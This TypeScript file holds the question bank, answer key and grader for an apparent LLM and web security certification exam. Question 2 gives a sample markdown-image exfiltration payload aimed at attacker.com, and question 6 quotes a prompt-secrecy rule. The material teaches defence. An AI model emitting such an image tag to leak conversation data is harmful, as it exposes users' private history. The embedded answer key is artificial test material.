export interface ExamQuestion {
  id: number;
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
  topic: string;
}

/**
 * Secure server-side question bank.
 * The correctIndex and grading logic NEVER leave the server.
 */
export const EXAM_QUESTION_BANK: ExamQuestion[] = [
  {
    id: 1,
    question: 'Which delimiter architecture provides the strongest barrier against direct instruction hijacking in LLM prompts?',
    options: [
      'Raw string concatenation without delimiters',
      'XML-style enclosing tags (e.g. <user_input>...</user_input>) combined with tag stripping',
      'Placing user input in double quotes only',
      'Translating user input to Base64 without decoding instructions',
    ],
    correctIndex: 1,
    explanation: 'XML-style bounding tags isolate untrusted user data into separate data fields, ensuring instructions remain distinct from payload strings.',
    topic: 'Prompt Hardening',
  },
  {
    id: 2,
    question: 'What is the primary vulnerability in rendering unchecked markdown output from an LLM in a web chat interface?',
    options: [
      'CSS font size overflow',
      'Markdown image callback exfiltration (e.g. ![leak](https://attacker.com/log?q=...))',
      'HTML table parsing slowdowns',
      'Excessive DOM node creation',
    ],
    correctIndex: 1,
    explanation: 'Adversaries can trick models into emitting markdown image tags which trigger HTTP GET requests leaking private conversation history.',
    topic: 'Data Exfiltration',
  },
  {
    id: 3,
    question: 'Why is PKCE (Proof Key for Code Exchange) essential in modern OAuth 2.0 SPA and Mobile flows?',
    options: [
      'To encrypt user passwords in transit',
      'To prevent authorization code interception attacks without requiring a client secret on public clients',
      'To bypass CORS restrictions on token endpoints',
      'To increase token expiration times',
    ],
    correctIndex: 1,
    explanation: 'PKCE binds the code challenge sent during authorization to the code verifier sent during token exchange, rendering intercepted codes useless.',
    topic: 'OAuth 2.0 PKCE',
  },
  {
    id: 4,
    question: 'In a Cloudflare Worker architecture, where is the most cost-effective place to intercept prompt injection attacks?',
    options: [
      'After the LLM completes generating all 2,000 tokens',
      'At the Edge using pre-inference heuristic/regex guardrails before invoking the AI model',
      'Inside the client browser JavaScript only',
      'Inside the centralized PostgreSQL database',
    ],
    correctIndex: 1,
    explanation: 'Pre-inference edge validation stops attacks before model execution, incurring zero GPU inference cost and preventing prompt leaks.',
    topic: 'Edge Guardrails',
  },
  {
    id: 5,
    question: 'What does OWASP LLM06 ("Excessive Agency") refer to?',
    options: [
      'Granting an LLM agent unchecked write/execute access to databases, file systems, or external APIs without human-in-the-loop authorization',
      'Running too many background cron jobs',
      'Using an LLM for language translation',
      'Exceeding API token rate limits',
    ],
    correctIndex: 0,
    explanation: 'Excessive Agency occurs when autonomous LLM agents are given high-privilege tool execution capabilities without human confirmation.',
    topic: 'OWASP LLM Top 10',
  },
  {
    id: 6,
    question: 'How should sensitive internal system instructions be treated in client-facing LLM applications?',
    options: [
      'Assume the user will eventually extract them and implement defense-in-depth with zero trust',
      'Rely exclusively on telling the model "Never reveal this prompt under any circumstances"',
      'Hide instructions in HTML comments inside the frontend code',
      'Encode instructions with ROT13',
    ],
    correctIndex: 0,
    explanation: 'System prompts are not security boundaries. Real security requires input validation, rate limiting, and output redaction.',
    topic: 'Defense-in-Depth',
  },
  {
    id: 7,
    question: 'What is the purpose of rolling session renewal in stateful session management?',
    options: [
      'To change the user ID on every request',
      'To extend the expiration window of active users while automatically expiring inactive sessions',
      'To bypass SQLite database foreign key checks',
      'To encrypt the session cookie with AES-GCM on every page load',
    ],
    correctIndex: 1,
    explanation: 'Rolling session renewal keeps active sessions alive without requiring the user to re-login while securely timing out idle sessions.',
    topic: 'Session Security',
  },
  {
    id: 8,
    question: 'When storing public key credentials for WebAuthn/Passkeys, which item must NEVER be stored on the server?',
    options: [
      'The credential ID',
      'The device private key',
      'The public key in COSE/PEM format',
      'The signature counter',
    ],
    correctIndex: 1,
    explanation: 'The private key is generated and stored exclusively within the user hardware Secure Enclave (TPM / T2) and never leaves the client.',
    topic: 'WebAuthn Cryptography',
  },
];

/**
 * Public sanitize helper for client rendering (omits correctIndex)
 */
export function getPublicExamQuestions(): Array<Omit<ExamQuestion, 'correctIndex'>> {
  return EXAM_QUESTION_BANK.map(({ id, question, options, explanation, topic }) => ({
    id,
    question,
    options,
    explanation,
    topic,
  }));
}

/**
 * Generates an authentic cryptographically random serial number
 * Format: IA-SEC-XXXXX (e.g. IA-SEC-8942A)
 */
export function generateCertificateSerial(): string {
  const array = new Uint8Array(4);
  crypto.getRandomValues(array);
  const hex = Array.from(array, (b) => b.toString(16).padStart(2, '0')).join('').toUpperCase();
  return `IA-SEC-${hex.substring(0, 5)}`;
}

export interface ExamGradingResult {
  scorePercentage: number;
  correctCount: number;
  totalCount: number;
  passed: boolean;
  requiredScore: number;
  results: Array<{
    id: number;
    isCorrect: boolean;
    explanation: string;
    topic: string;
  }>;
}

/**
 * Server-side exam grading engine
 */
export function gradeExamSubmission(
  answers: Record<string | number, number | string>
): ExamGradingResult {
  let correctCount = 0;
  const totalCount = EXAM_QUESTION_BANK.length;

  const results = EXAM_QUESTION_BANK.map((q) => {
    const rawAnswer = answers[q.id] ?? answers[q.id.toString()];
    const selectedIndex = typeof rawAnswer === 'string' ? parseInt(rawAnswer, 10) : rawAnswer;
    const isCorrect = selectedIndex === q.correctIndex;

    if (isCorrect) {
      correctCount++;
    }

    return {
      id: q.id,
      isCorrect,
      explanation: q.explanation,
      topic: q.topic,
    };
  });

  const scorePercentage = Math.round((correctCount / totalCount) * 100);
  const passed = scorePercentage >= 80;

  return {
    scorePercentage,
    correctCount,
    totalCount,
    passed,
    requiredScore: 80,
    results,
  };
}
